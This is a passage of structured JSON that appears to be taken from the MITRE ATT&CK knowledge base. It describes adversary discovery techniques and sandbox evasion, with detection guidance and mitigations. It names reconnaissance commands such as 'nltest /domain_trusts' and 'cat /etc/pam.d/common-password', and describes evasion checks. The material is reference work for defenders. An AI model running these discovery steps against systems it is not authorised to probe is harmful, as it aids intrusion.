Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l &lt;username&gt;</code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> <a href=\"https://superuser.com/questions/150675/how-to-display-password-policy-information-for-a-user-ubuntu\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Superuser Linux Password Policies)</a> <a href=\"https://www.jamf.com/jamf-nation/discussions/18574/user-password-policies-on-non-ad-machines\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Jamf User Password Policies)</a>. Adversaries may also leverage a Network Device CLI on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>). <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a>\n\nPassword policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS <a href=\"https://docs.aws.amazon.com/IAM/latest/APIReference/API_GetAccountPasswordPolicy.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS GetPasswordPolicy)</a>.","detection":"Monitor logs and processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity.","platforms":["Windows","Linux","macOS","IaaS","Network Devices","Identity Provider","SaaS","Office Suite"],"dataSources":["User Account: User Account Metadata","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1027","name":"Password Policies","description":"Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (<code>C:\\Windows\\System32\\</code> by default) of a domain controller and/or local computer with a corresponding entry in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms721766.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Install Password Filter n.d)</a>"}],"subTechniques":[]},{"id":"T1217","name":"Browser Information Discovery","description":"Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure. <a href=\"https://www.kaspersky.com/blog/browser-data-theft/27871/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Autofill)</a>\n\nBrowser information may also highlight additional targets after an adversary has access to valid credentials, especially Credentials In Files associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., <code>%APPDATA%/Google/Chrome</code>). <a href=\"https://support.google.com/chrome/a/answer/7349337\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chrome Roaming Profiles)</a>","detection":"Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as Windows Management Instrumentation and PowerShell.\n\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","File: File Access"],"mitigations":[],"subTechniques":[]},{"id":"T1482","name":"Domain Trust Discovery","description":"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Trusts)</a> Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. <a href=\"https://adsecurity.org/?p=1588\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Forging Trust Tickets)</a> <a href=\"https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Domain Trusts)</a> Domain trusts can be enumerated using the <code>DSEnumerateDomainTrusts()</code> Win32 API call, .NET methods, and LDAP. <a href=\"https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Domain Trusts)</a> The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts. <a href=\"https://www.microsoft.com/security/blog/2017/05/04/windows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Operation Wilysupply)</a>","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information, such as <code>nltest /domain_trusts</code>. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the <code>DSEnumerateDomainTrusts()</code> Win32 API call to spot activity associated with Domain Trust Discovery. <a href=\"https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Domain Trusts)</a> Information may also be acquired through Windows system management tools such as PowerShell. The .NET method <code>GetAllTrustRelationships()</code> can be an indicator of Domain Trust Discovery. <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.domain.getalltrustrelationships?redirectedfrom=MSDN&view=netframework-4.7.2#System_DirectoryServices_ActiveDirectory_Domain_GetAllTrustRelationships\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GetAllTrustRelationships)</a>","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Script: Script Execution","Network Traffic: Network Traffic Content","Process: OS API Execution"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Employ network segmentation for sensitive domains. <a href=\"https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Domain Trusts)</a>."},{"id":"M1047","name":"Audit","description":"Map the trusts within existing domains/forests and keep trust relationships to a minimum."}],"subTechniques":[]},{"id":"T1497","name":"Virtualization/Sandbox Evasion","description":"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. <a href=\"https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc/edit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Deloitte Environment Awareness)</a>\n\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox. <a href=\"https://unit42.paloaltonetworks.com/ups-observations-on-cve-2015-3113-prior-zero-days-and-the-pirpi-payload/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Pirpi July 2015)</a>","detection":"Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Process: OS API Execution"],"mitigations":[],"subTechniques":[{"id":"T1497.001","name":"System Checks","description":"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. <a href=\"https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc/edit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Deloitte Environment Awareness)</a>\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as <code>malware</code>, <code>sample</code>, or <code>hash</code>.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. <a href=\"https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/stopping-malware-fake-virtual-machine/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: McAfee Virtual Jan 2017)</a> In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices. <a href=\"https://researchcenter.paloaltonetworks.com/2018/09/unit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 OilRig Sept 2018)</a>","detection":"Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Process: OS API Execution"],"mitigations":[]},{"id":"T1497.002","name":"User Activity Based Checks","description":"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. <a href=\"https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc/edit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Deloitte Environment Awareness)</a>\n\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks <a href=\"https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sans Virtual Jan 2016)</a> , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro <a href=\"https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Sofacy Nov 2018)</a> or waiting for a user to double click on an embedded image to activate. <a href=\"https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye FIN7 April 2017)</a>","detection":"User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Process: Process Creation","Command: Command Execution"],"mitigations":[]},{"id":"T1497.003","name":"Time Based Checks","description":"Adversaries may employ various time-based methods to detect virtualization and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. This may include enumerating time-based properties, such as uptime or the system clock. \n\nAdversaries may use calls like <code>GetTickCount</code> and <code>GetSystemTimeAsFileTime</code> to discover if they are operating within a virtual machine or sandbox, or may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function. <a href=\"https://www.isaca.org/resources/isaca-journal/issues/2017/volume-6/evasive-malware-tricks-how-malware-evades-detection-by-sandboxes\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ISACA Malware Tricks)</a>","detection":"Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Process: Process Creation","Command: Command Execution"],"mitigations":[]}]},{"id":"T1518","name":"Software Discovery","description":"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nSuch software may be deployed widely across the environment for configuration management or security reasons, such as Software Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["ESXi","IaaS","Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Command: Command Execution","Process: Process Creation","Firewall: Firewall Enumeration","Firewall: Firewall Metadata"],"mitigations":[],"subTechniques":[{"id":"T1518.001","name":"Security Software Discovery","description":"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nIn cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.","platforms":["IaaS","Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Firewall: Firewall Metadata","Command: Command Execution","Process: OS API Execution","Firewall: Firewall Enumeration"],"mitigations":[]},{"id":"T1518.002","name":"Backup Software Discovery","description":"Adversaries may attempt to get a listing of backup software or configurations that are installed on a system. Adversaries may use this information to shape follow-on behaviors, such as Data Destruction, Inhibit System Recovery, or Data Encrypted for Impact.  \n\nCommands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for, such as Veeam, Acronis, Dropbox, or Paragon. <a href=\"https://www.security.com/threat-intelligence/play-ransomware-volume-shadow-copy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Play Ransomware 2023)</a>","detection":"","platforms":["Windows","macOS","Linux"],"dataSources":[],"mitigations":[]}]},{"id":"T1526","name":"Cloud Service Discovery","description":"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity. <a href=\"https://docs.microsoft.com/en-us/rest/api/resources/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure - Resource Manager API)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/azure/ad/graph/howto/azure-ad-graph-api-operations-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure AD Graph API)</a>\n\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services. <a href=\"https://github.com/Azure/Stormspotter\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure - Stormspotter)</a> <a href=\"https://github.com/RhinoSecurityLabs/pacu\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Pacu)</a>\n\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through Disable or Modify Tools or Disable or Modify Cloud Log.","detection":"Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nNormal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.","platforms":["IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["Cloud Service: Cloud Service Enumeration","Logon Session: Logon Session Creation"],"mitigations":[],"subTechniques":[]},{"id":"T1538","name":"Cloud Service Dashboard","description":"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, review findings of potential security risks, and run additional queries, such as finding public IP addresses and open ports. <a href=\"https://cloud.google.com/security-command-center/docs/quickstart-scc-dashboard\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Command Center Dashboard)</a>\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This also allows the adversary to gain information without manually making any API requests.","detection":"Monitor account activity logs to see actions performed and activity associated with the cloud service management console. Some cloud providers, such as AWS, provide distinct log events for login attempts to the management console. <a href=\"https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-aws-console-sign-in-events.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Console Sign-in Events)</a>","platforms":["IaaS","SaaS","Office Suite","Identity Provider"],"dataSources":["Logon Session: Logon Session Creation","User Account: User Account Authentication"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least-privilege by limiting dashboard visibility to only the resources required. This may limit the discovery value of the dashboard in the event of a compromised account."}],"subTechniques":[]},{"id":"T1580","name":"Cloud Infrastructure Discovery","description":"An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket’s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket. <a href=\"https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon Describe Instance)</a> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeInstances.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon Describe Instances API)</a> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/API/API_GetPublicAccessBlock.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Get Public Access Block)</a> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/API/API_HeadBucket.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Head Bucket)</a> Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project <a href=\"https://cloud.google.com/sdk/gcloud/reference/compute/instances/list\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Compute Instances)</a>, and Azure's CLI command <code>az vm list</code> lists details of virtual machines. <a href=\"https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AZ CLI)</a> In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through Wordlist Scanning. <a href=\"https://blog.malwarebytes.com/researchers-corner/2019/09/hacking-with-aws-incorporating-leaky-buckets-osint-workflow/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)</a>\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user. <a href=\"https://expel.io/blog/finding-evil-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel IO Evil in AWS)</a> The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence. <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2020)</a>An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. <a href=\"https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_DescribeDBInstances.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Describe DB Instances)</a> Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in Cloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves.","detection":"Establish centralized logging for the activity of cloud infrastructure components. Monitor logs for actions that could be taken to gather information about cloud infrastructure, including the use of discovery API calls by new or unexpected users and enumerations from unknown or malicious IP addresses. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.","platforms":["IaaS"],"dataSources":["Instance: Instance Enumeration","Cloud Storage: Cloud Storage Enumeration","Volume: Volume Enumeration","Snapshot: Snapshot Enumeration"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit permissions to discover cloud infrastructure in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies."}],"subTechniques":[]},{"id":"T1613","name":"Container and Resource Discovery","description":"Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs. <a href=\"https://docs.docker.com/engine/api/v1.41/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker API)</a> <a href=\"https://kubernetes.io/docs/concepts/overview/kubernetes-api/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes API)</a> In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.","detection":"Establish centralized logging for the activity of container and Kubernetes cluster components. This can be done by deploying logging agents on Kubernetes nodes and retrieving logs from sidecar proxies for application pods to detect malicious activity at the cluster level.\n\nMonitor logs for actions that could be taken to gather information about container infrastructure, including the use of discovery API calls by new or unexpected users. Monitor account activity logs to see actions performed and activity associated with the Kubernetes dashboard and other web applications.","platforms":["Containers"],"dataSources":["Pod: Pod Enumeration","Container: Container Enumeration"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least privilege by limiting dashboard visibility to only the required users. When using Kubernetes, avoid giving users wildcard permissions or adding users to the <code>system:masters</code> group, and use <code>RoleBindings</code> rather than <code>ClusterRoleBindings</code> to limit user privileges to specific namespaces. <a href=\"https://kubernetes.io/docs/concepts/security/rbac-good-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes RBAC)</a>"},{"id":"M1030","name":"Network Segmentation","description":"Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Limit communications with the container service to managed and secured channels, such as local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API and Kubernetes API Server. <a href=\"https://docs.docker.com/engine/security/protect-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Daemon Socket Protect)</a> <a href=\"https://kubernetes.io/docs/concepts/security/controlling-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes API Control Access)</a> In Kubernetes clusters deployed in cloud environments, use native cloud platform features to restrict the IP ranges that are permitted to access to API server. <a href=\"https://kubernetes.io/docs/concepts/security/overview/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Cloud Native Security)</a> Where possible, consider enabling just-in-time (JIT) access to the Kubernetes API to place additional restrictions on access. <a href=\"https://learn.microsoft.com/en-us/azure/aks/managed-aad\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AKS Azure AD 2023)</a>"}],"subTechniques":[]},{"id":"T1614","name":"System Location Discovery","description":"Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings. <a href=\"https://s3.documentcloud.org/documents/20413525/fbi-flash-indicators-of-compromise-ragnar-locker-ransomware-11192020-bc.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FBI Ragnar Locker 2020)</a> <a href=\"https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos Geolocation 2016)</a> <a href=\"https://www.bleepingcomputer.com/news/security/new-rat-malware-gets-commands-via-discord-has-ransomware-feature/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleepingcomputer RAT malware 2020)</a> Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host. <a href=\"https://s3.documentcloud.org/documents/20413525/fbi-flash-indicators-of-compromise-ragnar-locker-ransomware-11192020-bc.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FBI Ragnar Locker 2020)</a> In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance. <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-identity-documents.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Instance Identity Documents)</a> <a href=\"https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=windows\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Instance Metadata 2021)</a>\n\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services. <a href=\"https://securelist.com/transparent-tribe-part-1/98127/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Securelist Trasparent Tribe 2020)</a> <a href=\"https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos Geolocation 2016)</a>","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on 